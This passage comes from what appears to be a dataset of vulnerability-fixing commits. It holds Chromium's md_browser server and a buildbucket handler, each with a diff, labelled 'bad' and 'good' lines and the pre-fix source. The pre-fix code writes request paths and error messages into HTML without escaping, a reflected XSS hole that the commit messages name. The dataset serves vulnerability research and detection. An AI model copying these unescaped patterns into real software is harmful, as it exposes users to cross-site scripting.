Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')): print(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread.join() return retcode def _open_url(url): time.sleep(1) webbrowser.open(url) def _gitiles_slugify(value, _separator): \"\"\"Convert a string(representing a section title) to URL anchor name. This function is passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md Args: value: The name of a section that is to be converted. _separator: Unused. This is actually a configurable string that is used as a replacement character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little sense to have the separator charactor configurable. \"\"\" value=value.encode('ascii', 'replace') value=re.sub(r'[^-a-zA-Z0-9]', '_', value) value=value.replace(u' ', u'-') value=re.sub(r'([-_])[-_]+', r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level=top_level def server_bind(self): self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.bind(self.server_address) class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): path=self.path if path.startswith('/chromium/src/+/master'): path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level, path[1:])) if not full_path.startswith(self.server.top_level): self._DoUnknown() elif path in('/base.css', '/doc.css', '/prettify.css'): self._DoCSS(path[1:]) elif not os.path.exists(full_path): self._DoNotFound() elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png') elif path.lower().endswith('.jpg'): self._DoImage(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', 'markdown.extensions.tables', 'markdown.extensions.toc', 'gitiles_autolink', 'gitiles_ext_blocks', 'gitiles_smart_quotes', ] extension_configs={ 'markdown.extensions.toc':{ 'slugify': _gitiles_slugify }, } contents=self._Read(path[1:]) md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len([line for line in contents.splitlines() if(line.startswith(' not line.startswith(' md.treeprocessors['adjust_toc']=_AdjustTOC(has_a_single_h1) md_fragment=md.convert(contents).encode('utf-8') try: self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&', '&amp;').replace( '<', '&lt;').replace( '>', '&gt;').replace( '\"', '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text/css') self._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.</body>' '</html>' % self.path) def _DoDirListing(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' % (self.path.rstrip('/'), d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f.read()) f.close() def _Read(self, relpath, relative_to=None): if relative_to is None: relative_to=self.server.top_level assert not relpath.startswith(os.sep) path=os.path.join(relative_to, relpath) with codecs.open(path, encoding='utf-8') as fp: return fp.read() def _WriteHeader(self, content_type='text/plain', status_code=200): self.send_response(status_code) self.send_header('Content-Type', content_type) self.end_headers() def _WriteTemplate(self, template): contents=self._Read(os.path.join('tools', 'md_browser', template), relative_to=SRC_DIR) self.wfile.write(contents.encode('utf-8')) class _AdjustTOC(markdown.treeprocessors.Treeprocessor): def __init__(self, has_a_single_h1): super(_AdjustTOC, self).__init__() self.has_a_single_h1=has_a_single_h1 def run(self, tree): for toc_node in tree.findall(\".//*[@class='toc']\"): toc_ul=toc_node[0] if self.has_a_single_h1: toc_ul_li=toc_ul[0] ul_with_the_desired_toc_entries=toc_ul_li[1] else: ul_with_the_desired_toc_entries=toc_ul toc_node.remove(toc_ul) contents=ElementTree.SubElement(toc_node, 'h2') contents.text='Contents' contents.tail='\\n' toc_aux=ElementTree.SubElement(toc_node, 'div',{'class': 'toc-aux'}) toc_aux.text='\\n' toc_aux.append(ul_with_the_desired_toc_entries) toc_aux.tail='\\n' if __name__=='__main__': sys.exit(main(sys.argv[1:])) ",
                    "sourceWithComments": "#!/usr/bin/env python\n# Copyright 2015 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n\"\"\"Simple Markdown browser for a Git checkout.\"\"\"\nfrom __future__ import print_function\n\nimport SimpleHTTPServer\nimport SocketServer\nimport argparse\nimport codecs\nimport os\nimport re\nimport socket\nimport sys\nimport threading\nimport time\nimport webbrowser\nfrom xml.etree import ElementTree\n\n\nTHIS_DIR = os.path.realpath(os.path.dirname(__file__))\nSRC_DIR = os.path.dirname(os.path.dirname(THIS_DIR))\nsys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown'))\nimport markdown\n\n\ndef main(argv):\n  parser = argparse.ArgumentParser(prog='md_browser')\n  parser.add_argument('-p', '--port', type=int, default=8080,\n                      help='port to run on (default = %(default)s)')\n  parser.add_argument('-d', '--directory', type=str, default=SRC_DIR)\n  parser.add_argument('-e', '--external', action='store_true',\n                      help='whether to bind to external port')\n  parser.add_argument('file', nargs='?',\n                      help='open file in browser')\n  args = parser.parse_args(argv)\n\n  top_level = os.path.realpath(args.directory)\n  hostname = '0.0.0.0' if args.external else 'localhost'\n  server_address = (hostname, args.port)\n  s = Server(server_address, top_level)\n\n  origin = 'http://' + hostname\n  if args.port != 80:\n    origin += ':%s' % args.port\n  print('Listening on %s/' % origin)\n\n  thread = None\n  if args.file:\n    path = os.path.realpath(args.file)\n    if not path.startswith(top_level):\n      print('%s is not under %s' % (args.file, args.directory))\n      return 1\n    rpath = os.path.relpath(path, top_level)\n    url = '%s/%s' % (origin, rpath)\n    print('Opening %s' % url)\n    thread = threading.Thread(target=_open_url, args=(url,))\n    thread.start()\n\n  elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')):\n    print(' Try loading %s/docs/README.md' % origin)\n  elif os.path.isfile(os.path.join(args.directory, 'README.md')):\n    print(' Try loading %s/README.md' % origin)\n\n  retcode = 1\n  try:\n    s.serve_forever()\n  except KeyboardInterrupt:\n    retcode = 130\n  except Exception as e:\n    print('Exception raised: %s' % str(e))\n\n  s.shutdown()\n  if thread:\n    thread.join()\n  return retcode\n\n\ndef _open_url(url):\n  time.sleep(1)\n  webbrowser.open(url)\n\n\ndef _gitiles_slugify(value, _separator):\n  \"\"\"Convert a string (representing a section title) to URL anchor name.\n\n  This function is passed to \"toc\" extension as an extension option, so we\n  can emulate the way how Gitiles converts header titles to URL anchors.\n\n  Gitiles' official documentation about the conversion is at:\n\n  https://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md#Named-anchors\n\n  Args:\n    value: The name of a section that is to be converted.\n    _separator: Unused. This is actually a configurable string that is used\n        as a replacement character for spaces in the title, typically set to\n        '-'. Since we emulate Gitiles' way of slugification here, it makes\n        little sense to have the separator charactor configurable.\n  \"\"\"\n\n  # TODO(yutak): Implement accent removal. This does not seem easy without\n  # some library. For now we just make accented characters turn into\n  # underscores, just like other non-ASCII characters.\n\n  value = value.encode('ascii', 'replace')  # Non-ASCII turns into '?'.\n  value = re.sub(r'[^- a-zA-Z0-9]', '_', value)  # Non-alphanumerics to '_'.\n  value = value.replace(u' ', u'-')\n  value = re.sub(r'([-_])[-_]+', r'\\1', value)  # Fold hyphens and underscores.\n  return value\n\n\nclass Server(SocketServer.TCPServer):\n  def __init__(self, server_address, top_level):\n    SocketServer.TCPServer.__init__(self, server_address, Handler)\n    self.top_level = top_level\n\n  def server_bind(self):\n    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    self.socket.bind(self.server_address)\n\n\nclass Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n  def do_GET(self):\n    path = self.path\n\n    # strip off the repo and branch info, if present, for compatibility\n    # with gitiles.\n    if path.startswith('/chromium/src/+/master'):\n      path = path[len('/chromium/src/+/master'):]\n\n    full_path = os.path.realpath(os.path.join(self.server.top_level, path[1:]))\n\n    if not full_path.startswith(self.server.top_level):\n      self._DoUnknown()\n    elif path in ('/base.css', '/doc.css', '/prettify.css'):\n      self._DoCSS(path[1:])\n    elif not os.path.exists(full_path):\n      self._DoNotFound()\n    elif path.lower().endswith('.md'):\n      self._DoMD(path)\n    elif os.path.exists(full_path + '/README.md'):\n      self._DoMD(path + '/README.md')\n    elif path.lower().endswith('.png'):\n      self._DoImage(full_path, 'image/png')\n    elif path.lower().endswith('.jpg'):\n      self._DoImage(full_path, 'image/jpeg')\n    elif os.path.isdir(full_path):\n      self._DoDirListing(full_path)\n    elif os.path.exists(full_path):\n      self._DoRawSourceFile(full_path)\n    else:\n      self._DoUnknown()\n\n  def _DoMD(self, path):\n    extensions = [\n        'markdown.extensions.def_list',\n        'markdown.extensions.fenced_code',\n        'markdown.extensions.tables',\n        'markdown.extensions.toc',\n        'gitiles_autolink',\n        'gitiles_ext_blocks',\n        'gitiles_smart_quotes',\n    ]\n    extension_configs = {\n        'markdown.extensions.toc': {\n            'slugify': _gitiles_slugify\n        },\n    }\n\n    contents = self._Read(path[1:])\n\n    md = markdown.Markdown(extensions=extensions,\n                           extension_configs=extension_configs,\n                           tab_length=2,\n                           output_format='html4')\n\n    has_a_single_h1 = (len([line for line in contents.splitlines()\n                            if (line.startswith('#') and\n                                not line.startswith('##'))]) == 1)\n\n    md.treeprocessors['adjust_toc'] = _AdjustTOC(has_a_single_h1)\n\n    md_fragment = md.convert(contents).encode('utf-8')\n\n    try:\n      self._WriteHeader('text/html')\n      self._WriteTemplate('header.html')\n      self.wfile.write('<div class=\"doc\">')\n      self.wfile.write(md_fragment)\n      self.wfile.write('</div>')\n      self._WriteTemplate('footer.html')\n    except:\n      raise\n\n  def _DoRawSourceFile(self, full_path):\n    self._WriteHeader('text/html')\n    self._WriteTemplate('header.html')\n\n    self.wfile.write('<table class=\"FileContents\">')\n    with open(full_path) as fp:\n      # Escape html over the entire file at once.\n      data = fp.read().replace(\n          '&', '&amp;').replace(\n          '<', '&lt;').replace(\n          '>', '&gt;').replace(\n          '\"', '&quot;')\n      for i, line in enumerate(data.splitlines(), start=1):\n        self.wfile.write(\n          ('<tr class=\"u-pre u-monospace FileContents-line\">'\n           '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">'\n           '<a name=\"%(num)s\" '\n           'onclick=\"window.location.hash=%(quot)s#%(num)s%(quot)s\">'\n           '%(num)s</a></td>'\n           '<td class=\"FileContents-lineContents\">%(line)s</td></tr>')\n          % {'num': i, 'quot': \"'\", 'line': line})\n    self.wfile.write('</table>')\n\n    self._WriteTemplate('footer.html')\n\n  def _DoCSS(self, template):\n    self._WriteHeader('text/css')\n    self._WriteTemplate(template)\n\n  def _DoNotFound(self):\n    self._WriteHeader('text/html', status_code=404)\n    self.wfile.write('<html><body>%s not found</body></html>' % self.path)\n\n  def _DoUnknown(self):\n    self._WriteHeader('text/html', status_code=501)\n    self.wfile.write('<html><body>I do not know how to serve %s.</body>'\n                       '</html>' % self.path)\n\n  def _DoDirListing(self, full_path):\n    self._WriteHeader('text/html')\n    self._WriteTemplate('header.html')\n    self.wfile.write('<div class=\"doc\">')\n\n    self.wfile.write('<div class=\"Breadcrumbs\">\\n')\n    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)\n    self.wfile.write('</div>\\n')\n\n    for _, dirs, files in os.walk(full_path):\n      for f in sorted(files):\n        if f.startswith('.'):\n          continue\n        if f.endswith('.md'):\n          bold = ('<b>', '</b>')\n        else:\n          bold = ('', '')\n        self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' %\n                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))\n\n      self.wfile.write('<br/>\\n')\n\n      for d in sorted(dirs):\n        if d.startswith('.'):\n          continue\n        self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' %\n                         (self.path.rstrip('/'), d, d))\n\n      break\n\n    self.wfile.write('</div>')\n    self._WriteTemplate('footer.html')\n\n  def _DoImage(self, full_path, mime_type):\n    self._WriteHeader(mime_type)\n    with open(full_path) as f:\n      self.wfile.write(f.read())\n      f.close()\n\n  def _Read(self, relpath, relative_to=None):\n    if relative_to is None:\n      relative_to = self.server.top_level\n    assert not relpath.startswith(os.sep)\n    path = os.path.join(relative_to, relpath)\n    with codecs.open(path, encoding='utf-8') as fp:\n      return fp.read()\n\n  def _WriteHeader(self, content_type='text/plain', status_code=200):\n    self.send_response(status_code)\n    self.send_header('Content-Type', content_type)\n    self.end_headers()\n\n  def _WriteTemplate(self, template):\n    contents = self._Read(os.path.join('tools', 'md_browser', template),\n                          relative_to=SRC_DIR)\n    self.wfile.write(contents.encode('utf-8'))\n\n\nclass _AdjustTOC(markdown.treeprocessors.Treeprocessor):\n  def __init__(self, has_a_single_h1):\n    super(_AdjustTOC, self).__init__()\n    self.has_a_single_h1 = has_a_single_h1\n\n  def run(self, tree):\n    # Given\n    #\n    #     # H1\n    #\n    #     [TOC]\n    #\n    #     ## first H2\n    #\n    #     ## second H2\n    #\n    # the markdown.extensions.toc extension generates:\n    #\n    #     <div class='toc'>\n    #       <ul><li><a>H1</a>\n    #               <ul><li>first H2\n    #                   <li>second H2</li></ul></li><ul></div>\n    #\n    # for [TOC]. But, we want the TOC to have its own subheading, so\n    # we rewrite <div class='toc'><ul>...</ul></div> to:\n    #\n    #     <div class='toc'>\n    #        <h2>Contents</h2>\n    #        <div class='toc-aux'>\n    #          <ul>...</ul></div></div>\n    #\n    # In addition, if the document only has a single H1, it is usually the\n    # title, and we don't want the title to be in the TOC. So, we remove it\n    # and shift all of the title's children up a level, leaving:\n    #\n    #     <div class='toc'>\n    #       <h2>Contents</h2>\n    #       <div class='toc-aux'>\n    #       <ul><li>first H2\n    #           <li>second H2</li></ul></div></div>\n\n    for toc_node in tree.findall(\".//*[@class='toc']\"):\n      toc_ul = toc_node[0]\n      if self.has_a_single_h1:\n        toc_ul_li = toc_ul[0]\n        ul_with_the_desired_toc_entries = toc_ul_li[1]\n      else:\n        ul_with_the_desired_toc_entries = toc_ul\n\n      toc_node.remove(toc_ul)\n      contents = ElementTree.SubElement(toc_node, 'h2')\n      contents.text = 'Contents'\n      contents.tail = '\\n'\n      toc_aux = ElementTree.SubElement(toc_node, 'div', {'class': 'toc-aux'})\n      toc_aux.text = '\\n'\n      toc_aux.append(ul_with_the_desired_toc_entries)\n      toc_aux.tail = '\\n'\n\n\nif __name__ == '__main__':\n  sys.exit(main(sys.argv[1:]))\n"
                }
            },
            "msg": "md_brower: Escape URL and file names correctly.\n\nmd_browser did not escape URL paths and file names in several pages including\nthe 404 page, which made simple XSS possible by requesting a URL containing\n\"<script>\".\n\nThis patch adds HTML escapes in places where a URL path or a file name is\nprinted. This patch also decodes the percent encodings in the request path\nso that files containing symbols in their names can be shown correctly.\n\nNote that md_browser is a simple tool that is only used locally, thus this\nXSS is not really a big problem. However, there's no reason to leave those\nholes open.\n\nChange-Id: I71da5e388909abd61ea58036edfdf8277ecda420\nReviewed-on: https://chromium-review.googlesource.com/585513\nReviewed-by: Dirk Pranke <dpranke@chromium.org>\nCommit-Queue: Yuta Kitamura <yutak@chromium.org>\nCr-Commit-Position: refs/heads/master@{#490310}"
        }
    },
    "https://github.com/asdfghjjklllllaaa/infra": {
        "2f39f3df54fb79b56744f00bcf97583b3807851f": {
            "url": "https://api.github.com/repos/asdfghjjklllllaaa/infra/commits/2f39f3df54fb79b56744f00bcf97583b3807851f",
            "html_url": "https://github.com/asdfghjjklllllaaa/infra/commit/2f39f3df54fb79b56744f00bcf97583b3807851f",
            "sha": "2f39f3df54fb79b56744f00bcf97583b3807851f",
            "keyword": "XSS change",
            "diff": "diff --git a/appengine/cr-buildbucket/handlers.py b/appengine/cr-buildbucket/handlers.py\nindex aab171ff3..05cdd4563 100644\n--- a/appengine/cr-buildbucket/handlers.py\n+++ b/appengine/cr-buildbucket/handlers.py\n@@ -2,8 +2,6 @@\n # Use of this source code is governed by a BSD-style license that can be\n # found in the LICENSE file.\n \n-from google.appengine.api import users as gae_users\n-\n from components import auth\n from components import config as config_api\n from components import decorators\n@@ -62,8 +60,8 @@ class ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover\n   def get(self, build_id):\n     try:\n       build_id = int(build_id)\n-    except ValueError as ex:\n-      self.response.write(ex.message)\n+    except ValueError:\n+      self.response.write('invalid build id')\n       self.abort(400)\n \n     build = model.Build.get_by_id(build_id)\n@@ -71,7 +69,7 @@ def get(self, build_id):\n \n     if not can_view:\n       if auth.get_current_identity().is_anonymous:\n-        return self.redirect(gae_users.create_login_url(self.request.url))\n+        return self.redirect(self.create_login_url(self.request.url))\n       self.response.write('build %d not found' % build_id)\n       self.abort(404)\n \n",
            "message": "",
            "files": {
                "/appengine/cr-buildbucket/handlers.py": {
                    "changes": [
                        {
                            "diff": "\n # Use of this source code is governed by a BSD-style license that can be\n # found in the LICENSE file.\n \n-from google.appengine.api import users as gae_users\n-\n from components import auth\n from components import config as config_api\n from components import decorators\n",
                            "add": 0,
                            "remove": 2,
                            "filename": "/appengine/cr-buildbucket/handlers.py",
                            "badparts": [
                                "from google.appengine.api import users as gae_users"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n   def get(self, build_id):\n     try:\n       build_id = int(build_id)\n-    except ValueError as ex:\n-      self.response.write(ex.message)\n+    except ValueError:\n+      self.response.write('invalid build id')\n       self.abort(400)\n \n     build = model.Build.get_by_id(build_id)\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/appengine/cr-buildbucket/handlers.py",
                            "badparts": [
                                "    except ValueError as ex:",
                                "      self.response.write(ex.message)"
                            ],
                            "goodparts": [
                                "    except ValueError:",
                                "      self.response.write('invalid build id')"
                            ]
                        },
                        {
                            "diff": "\n \n     if not can_view:\n       if auth.get_current_identity().is_anonymous:\n-        return self.redirect(gae_users.create_login_url(self.request.url))\n+        return self.redirect(self.create_login_url(self.request.url))\n       self.response.write('build %d not found' % build_id)\n       self.abort(404)\n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/appengine/cr-buildbucket/handlers.py",
                            "badparts": [
                                "        return self.redirect(gae_users.create_login_url(self.request.url))"
                            ],
                            "goodparts": [
                                "        return self.redirect(self.create_login_url(self.request.url))"
                            ]
                        }
                    ],
                    "source": "\n from google.appengine.api import users as gae_users from components import auth from components import config as config_api from components import decorators from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import bq import bulkproc import config import expiration import model import notifications import service import swarming import user README_MD=( 'https://chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class MainHandler(webapp2.RequestHandler): \"\"\"Redirects to README.md.\"\"\" def get(self): return self.redirect(README_MD) class CronUpdateBuckets(webapp2.RequestHandler): \"\"\"Updates buckets from configs.\"\"\" @decorators.require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" def get(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" @auth.public def get(self, build_id): try: build_id=int(build_id) except ValueError as ex: self.response.write(ex.message) self.abort(400) build=model.Build.get_by_id(build_id) can_view=build and user.can_view_build_async(build).get_result() if not can_view: if auth.get_current_identity().is_anonymous: return self.redirect(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend-default') def post(self, host, task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders(webapp2.RequestHandler): \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi, config_api.ConfigApi, swarmbucket_api.SwarmbucketApi, ] routes=[ webapp2.Route(r'/', MainHandler), webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler), webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler), ] routes.extend(endpoints_webapp2.api_routes(endpoints_services)) routes.extend( endpoints_webapp2.api_routes(endpoints_services, base_path='/api') ) prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(access.AccessServicer()) prpc_server.add_service(api.BuildsApi()) routes +=prpc_server.get_routes() return routes def get_backend_routes(): prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(api.BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases', expiration.CronExpireBuildLeases), webapp2.Route(r'/internal/cron/buildbucket/expire_builds', expiration.CronExpireBuilds), webapp2.Route(r'/internal/cron/buildbucket/delete_builds', expiration.CronDeleteBuilds), webapp2.Route(r'/internal/cron/buildbucket/update_buckets', CronUpdateBuckets), webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod', bq.CronExportBuildsProd), webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route(r'/internal/cron/buildbucket/unregister-builders', UnregisterBuilders), webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>', notifications.TaskPublishNotification), webapp2.Route( r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>', TaskCancelSwarmingTask), ] +bulkproc.get_routes() +prpc_server.get_routes() ",
                    "sourceWithComments": "# Copyright 2017 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nfrom google.appengine.api import users as gae_users\n\nfrom components import auth\nfrom components import config as config_api\nfrom components import decorators\nfrom components import endpoints_webapp2\nfrom components import prpc\n\nimport webapp2\n\nfrom legacy import api as legacy_api\nfrom legacy import swarmbucket_api\nimport access\nimport api\nimport bq\nimport bulkproc\nimport config\nimport expiration\nimport model\nimport notifications\nimport service\nimport swarming\nimport user\n\nREADME_MD = (\n    'https://chromium.googlesource.com/infra/infra/+/master/'\n    'appengine/cr-buildbucket/README.md'\n)\n\n\nclass MainHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to README.md.\"\"\"\n\n  def get(self):\n    return self.redirect(README_MD)\n\n\nclass CronUpdateBuckets(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Updates buckets from configs.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    config.cron_update_buckets()\n\n\nclass BuildRPCHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to API explorer to see the build.\"\"\"\n\n  def get(self, build_id):\n    api_path = '/_ah/api/buildbucket/v1/builds/%s' % build_id\n    return self.redirect(api_path)\n\n\nclass ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover\n  \"\"\"Redirects to API explorer to see the build.\"\"\"\n\n  @auth.public\n  def get(self, build_id):\n    try:\n      build_id = int(build_id)\n    except ValueError as ex:\n      self.response.write(ex.message)\n      self.abort(400)\n\n    build = model.Build.get_by_id(build_id)\n    can_view = build and user.can_view_build_async(build).get_result()\n\n    if not can_view:\n      if auth.get_current_identity().is_anonymous:\n        return self.redirect(gae_users.create_login_url(self.request.url))\n      self.response.write('build %d not found' % build_id)\n      self.abort(404)\n\n    return self.redirect(str(build.url))\n\n\nclass TaskCancelSwarmingTask(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Cancels a swarming task.\"\"\"\n\n  @decorators.require_taskqueue('backend-default')\n  def post(self, host, task_id):\n    swarming.cancel_task(host, task_id)\n\n\nclass UnregisterBuilders(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    service.unregister_builders()\n\n\ndef get_frontend_routes():  # pragma: no cover\n  endpoints_services = [\n      legacy_api.BuildBucketApi,\n      config_api.ConfigApi,\n      swarmbucket_api.SwarmbucketApi,\n  ]\n  routes = [\n      webapp2.Route(r'/', MainHandler),\n      webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler),\n      webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler),\n  ]\n  routes.extend(endpoints_webapp2.api_routes(endpoints_services))\n  # /api routes should be removed once clients are hitting /_ah/api.\n  routes.extend(\n      endpoints_webapp2.api_routes(endpoints_services, base_path='/api')\n  )\n\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(access.AccessServicer())\n  prpc_server.add_service(api.BuildsApi())\n  routes += prpc_server.get_routes()\n\n  return routes\n\n\ndef get_backend_routes():  # pragma: no cover\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(api.BuildsApi())\n\n  return [  # pragma: no branch\n      webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases',\n                    expiration.CronExpireBuildLeases),\n      webapp2.Route(r'/internal/cron/buildbucket/expire_builds',\n                    expiration.CronExpireBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/delete_builds',\n                    expiration.CronDeleteBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/update_buckets',\n                    CronUpdateBuckets),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod',\n                    bq.CronExportBuildsProd),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental',\n                    bq.CronExportBuildsExperimental),\n      webapp2.Route(r'/internal/cron/buildbucket/unregister-builders',\n                    UnregisterBuilders),\n      webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>',\n                    notifications.TaskPublishNotification),\n      webapp2.Route(\n          r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>',\n          TaskCancelSwarmingTask),\n  ] + bulkproc.get_routes() + prpc_server.get_routes()\n"
                }
            },
            "msg": "[buildbucket] Follow up for /builds/<id> handler\n\nAddress the rest of comments in\nhttps://chromium-review.googlesource.com/c/infra/infra/+/1521306\n\nPrevent XSS and use self.create_login_url\n\nR=borenet@google.com, vadimsh@chromium.org\nBug: 941535\n\nChange-Id: I7be08f3db1c57f1dc7f424396cb36efbe1ffa190\nReviewed-on: https://chromium-review.googlesource.com/c/infra/infra/+/1521009\nReviewed-by: Vadim Shtayura <vadimsh@chromium.org>\nReviewed-by: Eric Boren <borenet@chromium.org>\nCommit-Queue: Nodir Turakulov <nodir@chromium.org>\nAuto-Submit: Nodir Turakulov <nodir@chromium.org>\nCr-Commit-Position: refs/heads/master@{#21376}"
        }
    },
    "https://github.com/dmknght/NGfuzz": {
        "38c184f73918a249f6bc4e395ca2e5385e1ef220": {
            "url": "https://api.github.com/repos/dmknght/NGfuzz/commits/38c184f73918a249f6bc4e395ca2e5385e1ef220",
            "html_url": "https://github.com/dmknght/NGfuzz/commit/38c184f73918a249f6bc4e395ca2e5385e1ef220",
            "sha": "38c184f73918a249f6bc4e395ca2e5385e1ef220",
            "keyword": "XSS check",
